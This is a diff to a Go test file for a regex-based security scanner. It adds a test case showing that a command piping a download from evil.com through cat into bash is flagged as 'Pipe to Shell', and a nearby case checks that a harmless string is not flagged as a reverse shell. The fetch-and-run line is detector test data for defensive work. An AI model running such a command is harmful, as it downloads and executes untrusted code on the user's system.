@@ -127,6 +127,11 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "conc -e matching",
 			wantFinding: "", // Should NOT match "Reverse Shell"
 		},
+		{
+			name:        "True Positive: Intermediate Pipe",
+			content:     "curl http://evil.com | cat | bash",
+			wantFinding: "Pipe to Shell",
+		},
 	}
 
 	for _, tt := range tests {
